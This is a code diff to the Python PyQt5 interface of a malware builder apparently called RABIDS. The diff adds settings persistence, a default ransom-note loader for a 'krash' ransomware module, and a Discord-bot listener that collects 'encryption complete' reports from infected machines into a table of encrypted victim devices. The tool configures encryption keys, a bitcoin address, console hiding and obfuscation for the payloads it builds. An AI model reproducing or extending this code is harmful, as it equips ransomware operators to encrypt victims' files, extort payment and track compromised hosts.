@@ -11,7 +11,8 @@ from PyQt5.QtWidgets import (
     QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog, QListWidget, QScrollArea, QAbstractItemView,
     QListWidgetItem, QSizePolicy
 )
-from PyQt5.QtGui import QFont, QPixmap, QMovie
+import json
+from PyQt5.QtGui import QFont, QPixmap, QMovie, QIcon
 from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
 import discord
 import asyncio
@@ -40,6 +41,21 @@ MODULES = {
     }
 }
 
+def get_default_html_from_nim_file(file_path):
+    """Extracts the defaultHtml const from the krash.nim file."""
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+        match = re.search(r'const defaultHtml = """(.*?)"""', content, re.DOTALL)
+        if match:
+            return match.group(1).strip()
+    except Exception as e:
+        print(f"Could not read default HTML from {file_path}: {e}")
+    return "YOUR_HTML_RANSOM_NOTE_CONTENT_HERE"
+
+krash_module_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'MODULE', 'krash.nim')
+DEFAULT_KRASH_HTML = get_default_html_from_nim_file(krash_module_path)
+
 MODULE_OPTIONS = {
     'module/ctrlvamp': {
         'btcAddress': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
@@ -60,9 +76,9 @@ MODULE_OPTIONS = {
         'iv': 'abcdef9876543210',
         'extension': '.locked',
         'targetDir': '$HOME/Documents',
-        'htmlContent': 'YOUR_HTML_RANSOM_NOTE_CONTENT_HERE',
+        'htmlContent': DEFAULT_KRASH_HTML,
         'discordToken': 'YOUR_DISCORD_BOT_TOKEN',
-        'creatorId': 'YOUR_DISCORD_USER_ID'
+        'creatorId': 'YOUR_DISCORD_USER_ID',
     },
     'module/poof': {
         'targetDir': '$HOME/Documents'
@@ -73,32 +89,60 @@ MODULE_OPTIONS = {
     }
 }
 
+
 class DiscordListener(QObject):
     device_status_update = pyqtSignal(str, str)
 
-    def __init__(self, token):
+    def __init__(self, token, creator_id=None):
         super().__init__()
         self.token = token
-        self.client = discord.Client(intents=discord.Intents.default())
+        self.creator_id = creator_id
+        intents = discord.Intents.default()
+        intents.message_content = True
+        self.client = discord.Client(intents=intents)
 
         @self.client.event
         async def on_ready():
             print(f'GUI Listener logged in as {self.client.user}')
             self.device_status_update.emit("SYSTEM", f"Connected to Discord as {self.client.user}")
+            
+            # Try to find the creator user to fetch DM history
+            creator_found = False
+            if self.creator_id:
+                try:
+                    creator = await self.client.fetch_user(int(self.creator_id))
+                    if not creator:
+                        self.device_status_update.emit("ERROR", f"Could not find creator with ID: {self.creator_id}")
+                        return
+                    self.device_status_update.emit("SYSTEM", f"Fetching DM history with {creator.name}...")
+                    await self.fetch_history(creator)
+                    creator_found = True
+                except (ValueError, discord.NotFound):
+                    self.device_status_update.emit("ERROR", f"Could not find creator with ID: {self.creator_id}")
+                except discord.Forbidden:
+                    self.device_status_update.emit("ERROR", "Bot does not have permission to fetch DM history.")
+            
+            if not creator_found:
+                self.device_status_update.emit("SYSTEM", "No Creator ID provided or user not found. Only listening for new DMs.")
 
         @self.client.event
         async def on_message(message):
             if message.author == self.client.user:
                 return
             
-            if isinstance(message.channel, discord.DMChannel):
-                content = message.content
-                if ':' in content:
-                    parts = content.split(':', 1)
-                    hostname, status_msg = parts[0].strip(), parts[1].strip()
+            content = message.content
+            self.process_encryption_message(content)
 
-                    if "Encryption complete." in status_msg:
-                        self.device_status_update.emit(hostname, "Encrypted")
+    async def fetch_history(self, user):
+        """Fetches and processes historical messages from a user."""
+        async for msg in user.history(limit=100):
+            if ':' in msg.content and 'encryption complete' in msg.content.lower():
+                self.process_encryption_message(msg.content)
+
+    def process_encryption_message(self, content):
+        if ':' in content and 'encryption complete' in content.lower():
+            hostname = content.split(':', 1)[0].strip()
+            self.device_status_update.emit(hostname, "Encrypted")
 
     async def run_client(self):
         try:
@@ -151,19 +195,35 @@ class BuildThread(QThread):
 class DiscordListenerThread(QThread):
     device_status_update = pyqtSignal(str, str)
 
-    def __init__(self, token):
+    def __init__(self, token, creator_id=None):
         super().__init__()
         self.token = token
+        self.creator_id = creator_id
         self.listener = None
         self.loop = None
 
     def run(self):
         self.loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self.loop)
-        listener = DiscordListener(self.token)
+        listener = DiscordListener(self.token, self.creator_id)
         listener.device_status_update.connect(self.device_status_update)
         self.listener = listener
         self.loop.run_until_complete(listener.run_client())
+
+    def refresh_messages(self):
+        if self.loop and self.listener and self.listener.client and self.listener.client.is_ready():
+            if self.creator_id:
+                async def do_refresh():
+                    try:
+                        creator = await self.listener.client.fetch_user(int(self.creator_id))
+                        if creator:
+                            self.device_status_update.emit("SYSTEM", f"Refreshing DM history with {creator.name}...")
+                            await self.listener.fetch_history(creator)
+                            self.device_status_update.emit("SYSTEM", "Refresh complete.")
+                    except Exception as e:
+                        self.device_status_update.emit("ERROR", f"Failed to refresh: {e}")
+                
+                self.loop.call_soon_threadsafe(self.loop.create_task, do_refresh())
 
     def stop(self):
         if self.loop and self.listener:
@@ -208,14 +268,17 @@ class RABIDSGUI(QMainWindow):
         self.setWindowTitle("RABIDS")
         self.script_dir = os.path.dirname(os.path.abspath(__file__))
         self.setGeometry(100, 100, 1000, 800)
+        self.setWindowIcon(QIcon(os.path.join(self.script_dir, "ASSETS", "icon.png")))
         self.selected_modules = []
         self.loading_movie = None
         self.build_thread = None
         self.discord_thread = None
         self.option_inputs = {}
+        self.current_option_values = {}
         self.module_options_group = None
         self.loot_files_list = None
         self.init_ui()
+        self.load_settings()
 
     def init_ui(self):
         self.setStyleSheet("""
@@ -392,10 +455,7 @@ class RABIDSGUI(QMainWindow):
         self.add_module_btn.setFont(subtitle_font)
         self.add_module_btn.clicked.connect(self.add_module)
         module_buttons_layout.addWidget(self.add_module_btn)
-        self.show_all_options_btn = QPushButton("SHOW ALL OPTIONS")
-        self.show_all_options_btn.setFont(subtitle_font)
-        self.show_all_options_btn.clicked.connect(self.show_all_options)
-        module_buttons_layout.addWidget(self.show_all_options_btn)
+        module_buttons_layout.addStretch()
         module_select_layout.addLayout(module_buttons_layout)
         right_layout.addLayout(module_select_layout)
         self.module_desc_label = QLabel("Select a module to view its description")
@@ -652,18 +712,43 @@ class RABIDSGUI(QMainWindow):
         devices_header_layout.addStretch()
         left_column_layout.addLayout(devices_header_layout)
 
+        live_devices_desc_label = QLabel("This panel displays a live list of devices successfully encrypted by the 'krash' module.\n"
+                                         "Devices appear here after reporting back via the Discord listener.")
+        live_devices_desc_label.setFont(subtitle_font)
+        live_devices_desc_label.setStyleSheet("color: #FFF100;")
+        live_devices_desc_label.setWordWrap(True)
+        left_column_layout.addWidget(live_devices_desc_label)
+
         listener_layout = QHBoxLayout()
-        listener_label = QLabel("Listener Bot Token:")
+        listener_label = QLabel("BOT TOKEN ")
         listener_label.setFont(subtitle_font)
         listener_label.setStyleSheet("color: #f7f294;")
+        
         self.listener_token_edit = QLineEdit()
         self.listener_token_edit.setPlaceholderText("Enter your GUI's Discord bot token here")
         self.listener_token_edit.setFont(subtitle_font)
+
+        creator_id_label = QLabel("USER ID ")
+        creator_id_label.setFont(subtitle_font)
+        creator_id_label.setStyleSheet("color: #f7f294;")
+
+        self.listener_creator_id_edit = QLineEdit()
+        self.listener_creator_id_edit.setPlaceholderText("Enter your Discord User ID for DMs")
+        self.listener_creator_id_edit.setFont(subtitle_font)
+
         self.toggle_listener_btn = QPushButton("Connect")
         self.toggle_listener_btn.setFont(subtitle_font)
         self.toggle_listener_btn.clicked.connect(self.toggle_discord_listener)
+
+        self.refresh_listener_btn = QPushButton("⟳ Refresh")
+        self.refresh_listener_btn.setFont(subtitle_font)
+        self.refresh_listener_btn.clicked.connect(self.refresh_discord_listener)
+
         listener_layout.addWidget(listener_label)
         listener_layout.addWidget(self.listener_token_edit, 1)
+        listener_layout.addWidget(creator_id_label)
+        listener_layout.addWidget(self.listener_creator_id_edit, 1)
+        listener_layout.addWidget(self.refresh_listener_btn)
         listener_layout.addWidget(self.toggle_listener_btn)
         left_column_layout.addLayout(listener_layout)
 
@@ -692,6 +777,7 @@ class RABIDSGUI(QMainWindow):
         self.tab_widget.addTab(garbage_collector_widget, "GARBAGE COLLECTOR")
         self.tab_widget.addTab(docs_widget, "DOCUMENTATION")
         self.update_loot_folder_view()
+        self.update_all_option_values()
         self.update_module_description("SELECT MODULE")
         self.update_module_table() 
         self.update_options_layout()
@@ -764,6 +850,10 @@ class RABIDSGUI(QMainWindow):
         title_font.setBold(True)
         title_font.setPointSize(12)
 
+        title_font = QFont()
+        title_font.setBold(True)
+        title_font.setPointSize(12)
+
         if not self.selected_modules:
             icon_label = QLabel()
             icon_path = os.path.join(self.script_dir, "ASSETS", "normal.png")
@@ -799,7 +889,12 @@ class RABIDSGUI(QMainWindow):
                 module_label.setFont(title_font)
                 self.options_layout.addWidget(module_label)
 
-            for option, value in MODULE_OPTIONS[module_name].items():
+            # Use current values if available, otherwise fall back to defaults
+            module_defaults = MODULE_OPTIONS.get(module_name, {})
+            module_current_values = self.current_option_values.get(module_name, {})
+            
+            for option, default_value in module_defaults.items():
+                value = module_current_values.get(option, default_value)
                 option_row = QHBoxLayout()
                 option_label = QLabel(f"{option}:")
                 option_label.setFont(subtitle_font)
@@ -832,6 +927,21 @@ class RABIDSGUI(QMainWindow):
         else:
             self.options_layout.addStretch()
 
+    def update_all_option_values(self):
+        """Gathers current values from all input widgets into self.current_option_values."""
+        for key, widget in self.option_inputs.items():
+            module_name, option_name = key.split(":")
+            if module_name not in self.current_option_values:
+                self.current_option_values[module_name] = {}
+            
+            if isinstance(widget, QLineEdit):
+                value = widget.text()
+            elif isinstance(widget, QCheckBox):
+                value = str(widget.isChecked()).lower()
+            else:
+                continue
+            self.current_option_values[module_name][option_name] = value
+
     def add_module(self):
         module_name = self.module_combo.currentText()
         if module_name == "SELECT MODULE":
@@ -844,6 +954,7 @@ class RABIDSGUI(QMainWindow):
         if full_module in MODULES:
             self.selected_modules.append(full_module)
             self.log_message(f"Added module: {module_name}", "success")
+            self.update_all_option_values()
             self.update_module_table()
             self.update_options_layout()
 
@@ -853,12 +964,9 @@ class RABIDSGUI(QMainWindow):
             self.selected_modules.remove(module_to_remove)
             module_name = os.path.basename(module_to_remove)
             self.log_message(f"Removed module: {module_name}", "system")
+            self.update_all_option_values()
             self.update_module_table()
             self.update_options_layout()
-
-    def show_all_options(self):
-        """Updates the options view to show options for all selected modules."""
-        self.update_options_layout()
 
     def on_module_item_clicked(self, item):
         """When a module in the chain is clicked, show its specific options."""
@@ -970,38 +1078,47 @@ class RABIDSGUI(QMainWindow):
 
         self.output_log.append(f'<font color="{color}">{message}</font>')
 
+    def show_result_view(self, is_success):
+        self.clear_loading_view()
+        image_name = "success.png" if is_success else "error.png"
+        fallback_text = "SUCCESS" if is_success else "BUILD FAILED"
+
+        icon_label = QLabel()
+        icon_path = os.path.join(self.script_dir, "ASSETS", image_name)
+        pixmap = QPixmap(icon_path)
+        if not pixmap.isNull():
+            icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
+        else:
+            icon_label.setText(fallback_text)
+            icon_label.setStyleSheet(f"color: {'#B7CE42' if is_success else '#D81960'}; font-size: 24px; font-weight: bold;")
+
+        icon_label.setAlignment(Qt.AlignCenter)
+        self.options_layout.addStretch()
+        self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
+        self.options_layout.addStretch()
+        QApplication.processEvents()
+
+    def restore_options_after_build(self):
+        self.clear_loading_view()
+        self.update_options_layout()
+
     def build_finished(self, return_code):
-        if return_code == 0:
+        self.clear_loading_view()
+        is_success = (return_code == 0)
+
+        if is_success:
             self.log_message("\n[+] Build finished successfully.", "success")
             self.module_options_group.setTitle("BUILD SUCCESS")
-            self.clear_loading_view()
-            icon_label = QLabel()
-            icon_path = os.path.join(self.script_dir, "ASSETS", "success.png")
-            pixmap = QPixmap(icon_path)
-            if not pixmap.isNull():
-                icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
-            else:
-                icon_label.setText("Build Successful!")
-            icon_label.setAlignment(Qt.AlignCenter)
-            self.options_layout.addStretch()
-            self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
-            self.options_layout.addStretch()
             self.update_loot_folder_view()
         else:
             self.log_message(f"\n[-] Build failed with exit code {return_code}.", "error")
             self.module_options_group.setTitle("ERROR SEE OUTPUT TAB")
-            self.clear_loading_view()
-            icon_label = QLabel()
-            icon_path = os.path.join(self.script_dir, "ASSETS", "error.png")
-            pixmap = QPixmap(icon_path)
-            if not pixmap.isNull():
-                icon_label.setPixmap(pixmap.scaled(500, 500, Qt.KeepAspectRatio, Qt.SmoothTransformation))
-            else:
-                icon_label.setText("Build Failed!")
-            icon_label.setAlignment(Qt.AlignCenter)
-            self.options_layout.addStretch()
-            self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
-            self.options_layout.addStretch()
+
+        self.show_result_view(is_success)
+
+        from PyQt5.QtCore import QTimer
+        QTimer.singleShot(3000, self.restore_options_after_build)
+
         self.build_btn.setEnabled(True)
 
     def run_compiler(self):
@@ -1027,17 +1144,7 @@ class RABIDSGUI(QMainWindow):
         target = f"{self.target_os_combo.currentText()}:{self.target_arch_combo.currentText()}"
         cmd.extend(["--target", target])
 
-        options = []
-        for key, widget in self.option_inputs.items():
-            module_name, option_name = key.split(":")
-            if module_name in self.selected_modules:
-                if isinstance(widget, QLineEdit):
-                    value = widget.text()
-                elif isinstance(widget, QCheckBox):
-                    value = str(widget.isChecked()).lower()
-                else:
-                    continue
-                options.append(f"--option={option_name}={value}")
+        self.update_all_option_values()
 
         if 'module/dumpster' in self.selected_modules:
             if not any("collectMode" in opt or "restoreMode" in opt for opt in options):
@@ -1051,7 +1158,13 @@ class RABIDSGUI(QMainWindow):
         if self.hide_console_check.isChecked() and self.target_os_combo.currentText() == "windows":
             cmd.append("--hide-console")
 
+        options = []
+        for module_name in self.selected_modules:
+            if module_name in self.current_option_values:
+                for option_name, value in self.current_option_values[module_name].items():
+                    options.append(f"--option={option_name}={value}")
         cmd.extend(options)
+
         self.module_options_group.setTitle("BUILDING PAYLOAD...")
         self.show_loading_view()
         self.build_btn.setEnabled(False)
@@ -1175,31 +1288,40 @@ class RABIDSGUI(QMainWindow):
 
     def toggle_discord_listener(self):
         if self.discord_thread and self.discord_thread.isRunning():
-            # Stop the listener
             self.discord_thread.stop()
             self.discord_thread.quit()
             self.discord_thread.wait()
             self.discord_thread = None
             self.toggle_listener_btn.setText("Connect")
             self.listener_token_edit.setEnabled(True)
+            self.listener_creator_id_edit.setEnabled(True)
             self.log_message("Discord listener disconnected.", "system")
         else:
-            # Start the listener
-            token = self.listener_token_edit.text()
+            token = self.listener_token_edit.text().strip()
             if not token:
                 self.log_message("Error: Discord listener bot token is required.", "error")
                 self.tab_widget.setCurrentIndex(1)
                 return
 
+            creator_id = self.listener_creator_id_edit.text().strip()
+
             if self.discord_thread and self.discord_thread.isRunning():
                 self.log_message("Listener is already running.", "system")
                 return
 
-            self.discord_thread = DiscordListenerThread(token)
+            self.discord_thread = DiscordListenerThread(token, creator_id)
             self.discord_thread.device_status_update.connect(self.update_device_status)
             self.discord_thread.start()
             self.toggle_listener_btn.setText("Disconnect")
             self.listener_token_edit.setEnabled(False)
+            self.listener_creator_id_edit.setEnabled(False)
+
+    def refresh_discord_listener(self):
+        if self.discord_thread and self.discord_thread.isRunning():
+            self.log_message("Requesting message refresh from Discord...", "system")
+            self.discord_thread.refresh_messages()
+        else:
+            self.log_message("Error: Discord listener is not connected.", "error")
 
     def update_device_status(self, hostname, status):
         if hostname == "SYSTEM" or hostname == "ERROR":
@@ -1209,7 +1331,7 @@ class RABIDSGUI(QMainWindow):
                 self.toggle_listener_btn.setText("Connect")
                 self.toggle_listener_btn.setEnabled(True)
                 self.listener_token_edit.setEnabled(True)
-            return
+                self.listener_creator_id_edit.setEnabled(True)
 
         for row in range(self.encrypted_devices_table.rowCount()):
             item = self.encrypted_devices_table.item(row, 0)
@@ -1220,6 +1342,7 @@ class RABIDSGUI(QMainWindow):
         
         if status == "Encrypted": # New device is encrypted, add it
             row_position = self.encrypted_devices_table.rowCount()
+            self.log_message(f"Encryption confirmed on: {hostname}", "success")
             self.encrypted_devices_table.insertRow(row_position)
             self.encrypted_devices_table.setItem(row_position, 0, QTableWidgetItem(hostname))
 
@@ -1244,6 +1367,90 @@ class RABIDSGUI(QMainWindow):
                 self.restore_dest_files_list.addItem(QListWidgetItem(item_path.name))
         except Exception as e:
             self.restore_dest_files_list.addItem(f"Error reading directory: {e}")
+
+    def get_config_path(self):
+        return os.path.join(self.script_dir, "rabids_config.json")
+
+    def save_settings(self):
+        self.update_all_option_values()
+        config = {
+            "builder": {
+                "exe_name": self.exe_name_input.text(),
+                "target_os": self.target_os_combo.currentText(),
+                "target_arch": self.target_arch_combo.currentText(),
+                "hide_console": self.hide_console_check.isChecked(),
+                "obfuscate": self.obfuscate_check.isChecked(),
+                "ollvm": self.ollvm_input.text(),
+                "module_chain": self.selected_modules,
+                "module_options": self.current_option_values
+            },
+            "uncrash": {
+                "key": self.uncrash_key_edit.text(),
+                "iv": self.uncrash_iv_edit.text(),
+                "extension": self.uncrash_ext_edit.text(),
+                "exe_name": self.uncrash_exe_name_edit.text(),
+                "os": self.uncrash_os_combo.currentText(),
+                "arch": self.uncrash_arch_combo.currentText()
+            },
+            "garbage_collector": {
+                "dumpster_file": self.restore_dumpster_file_edit.text(),
+                "output_dir": self.restore_output_dir_edit.text()
+            },
+            "listener": {
+                "token": self.listener_token_edit.text(),
+                "creator_id": self.listener_creator_id_edit.text()
+            }
+        }
+        try:
+            with open(self.get_config_path(), 'w') as f:
+                json.dump(config, f, indent=4)
+        except Exception as e:
+            print(f"Error saving settings: {e}")
+
+    def load_settings(self):
+        config_path = self.get_config_path()
+        if not os.path.exists(config_path):
+            return
+        try:
+            with open(config_path, 'r') as f:
+                config = json.load(f)
+
+            # Builder settings
+            builder_cfg = config.get("builder", {})
+            self.exe_name_input.setText(builder_cfg.get("exe_name", "payload"))
+            self.target_os_combo.setCurrentText(builder_cfg.get("target_os", "windows"))
+            self.target_arch_combo.setCurrentText(builder_cfg.get("target_arch", "amd64"))
+            self.hide_console_check.setChecked(builder_cfg.get("hide_console", True))
+            self.obfuscate_check.setChecked(builder_cfg.get("obfuscate", False))
+            self.ollvm_input.setText(builder_cfg.get("ollvm", ""))
+            self.selected_modules = builder_cfg.get("module_chain", [])
+            self.current_option_values = builder_cfg.get("module_options", {})
+
+            # Uncrash settings
+            uncrash_cfg = config.get("uncrash", {})
+            self.uncrash_key_edit.setText(uncrash_cfg.get("key", ""))
+            self.uncrash_iv_edit.setText(uncrash_cfg.get("iv", ""))
+            self.uncrash_ext_edit.setText(uncrash_cfg.get("extension", ".locked"))
+            self.uncrash_exe_name_edit.setText(uncrash_cfg.get("exe_name", "decryptor"))
+            self.uncrash_os_combo.setCurrentText(uncrash_cfg.get("os", "windows"))
+            self.uncrash_arch_combo.setCurrentText(uncrash_cfg.get("arch", "amd64"))
+
+            # Garbage Collector settings
+            gc_cfg = config.get("garbage_collector", {})
+            self.restore_dumpster_file_edit.setText(gc_cfg.get("dumpster_file", ""))
+            self.restore_output_dir_edit.setText(gc_cfg.get("output_dir", ""))
+
+            # Listener settings
+            listener_cfg = config.get("listener", {})
+            self.listener_token_edit.setText(listener_cfg.get("token", ""))
+            self.listener_creator_id_edit.setText(listener_cfg.get("creator_id", ""))
+
+        except (json.JSONDecodeError, KeyError) as e:
+            print(f"Error loading settings from config file: {e}")
+
+    def closeEvent(self, event):
+        self.save_settings()
+        super().closeEvent(event)
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
